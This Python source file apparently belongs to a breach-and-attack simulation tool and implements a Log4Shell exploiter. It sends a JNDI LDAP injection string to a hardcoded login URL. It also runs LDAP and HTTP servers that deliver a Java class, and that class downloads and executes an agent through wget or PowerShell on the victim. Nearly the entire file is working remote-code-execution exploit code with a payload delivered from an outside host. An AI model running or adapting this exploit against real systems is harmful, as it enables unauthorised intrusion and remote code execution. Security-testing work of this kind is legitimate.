import http.client
import http.server
import logging
from threading import Thread

import requests

from common.utils.exploit_enum import ExploitType
from infection_monkey.exploit.log4shell_utils import LDAPExploitServer, build_exploit_bytecode
from infection_monkey.exploit.tools.http_tools import HTTPTools
from infection_monkey.exploit.web_rce import WebRCE
from infection_monkey.model import POWERSHELL_HTTP_UPLOAD, WGET_HTTP_UPLOAD, VictimHost
from infection_monkey.network.tools import get_interface_to_target
from infection_monkey.utils.monkey_dir import get_monkey_dir_path

logger = logging.getLogger(__name__)

LDAP_PAYLOAD = "${jndi:ldap://192.168.56.1:8080/dn=Exploit}"


class Log4ShellExploiter(WebRCE):
    _TARGET_OS_TYPE = ["linux", "windows"]
    EXPLOIT_TYPE = ExploitType.VULNERABILITY
    _EXPLOITED_SERVICE = "Log4j"
    LDAP_PORT = 8080
    CLASS_HTTP_SERVER_PORT = 1337
    DOWNLOAD_TIMEOUT = 15
    URLS = ["http://192.168.56.101:8080/login"]

    def __init__(self, host: VictimHost):
        super().__init__(host)
        self._client = None

    def exploit_host(self):

        paths = self.get_monkey_paths()
        # Create server for http download and wait for it's startup.
        http_path, http_thread = HTTPTools.create_locked_transfer(self.host, paths["src_path"])
        if not http_path:
            logger.debug("Exploiter failed, http transfer creation failed.")
            return False
        logger.info("Started http server on %s", http_path)

        commands = {"windows": POWERSHELL_HTTP_UPLOAD, "linux": WGET_HTTP_UPLOAD}
        command = self.get_command(paths["dest_path"], http_path, commands)

        java_class = self.build_java_class(command)
        class_http_server_ip = get_interface_to_target(self.host.ip_addr)

        java_class_http_thread = self.get_java_class_server_thread(class_http_server_ip, java_class)
        java_class_http_thread.start()

        ldap = LDAPExploitServer(
            ldap_server_port=8080,
            http_server_ip=class_http_server_ip,
            http_server_port=self.CLASS_HTTP_SERVER_PORT,
            storage_dir=get_monkey_dir_path(),
        )
        ldap_thread = ldap.get_run_thread()
        ldap_thread.start()

        payload = {"uname": LDAP_PAYLOAD, "password": "m0nk3y"}
        try:
            response = requests.post(
                Log4ShellExploiter.URLS[0], data=payload, timeout=5, verify=False
            )
        except requests.ReadTimeout:
            logger.error("Couldn't send request to the vulnerable machine")
            return False
        finally:
            http_thread.join(Log4ShellExploiter.DOWNLOAD_TIMEOUT)
            http_thread.stop()

            java_class_http_thread.join(Log4ShellExploiter.DOWNLOAD_TIMEOUT)
            Log4ShellExploiter.HTTPHandler.stop = True

            ldap_thread.join(Log4ShellExploiter.DOWNLOAD_TIMEOUT)
            ldap.stop()
        return True

    def build_java_class(self, exploit_command: str) -> bytes:
        return build_exploit_bytecode(exploit_command)

    def upload_monkey(self, url, commands=None):
        pass

    def exploit(self, url, command):
        pass

    class HTTPHandler(http.server.BaseHTTPRequestHandler):

        java_class: bytes
        class_downloaded = False
        stop = False

        def do_GET(self):
            logger.error("Got a get request!")
            self.send_response(200)
            self.send_header("Content-type", "application/octet-stream")
            self.end_headers()
            logger.info("Sending payload class!")
            self.wfile.write(self.java_class)
            Log4ShellExploiter.HTTPHandler.class_downloaded = True

    @staticmethod
    def _run_class_http_server(ip):

        server = http.server.HTTPServer(
            (ip, Log4ShellExploiter.CLASS_HTTP_SERVER_PORT), Log4ShellExploiter.HTTPHandler
        )
        while (
            not Log4ShellExploiter.HTTPHandler.class_downloaded
            and not Log4ShellExploiter.HTTPHandler.stop
        ):
            server.handle_request()

    def get_java_class_server_thread(self, ip: str, java_class: bytes):
        Log4ShellExploiter.HTTPHandler.java_class = java_class

        return Thread(target=Log4ShellExploiter._run_class_http_server, args=[ip])
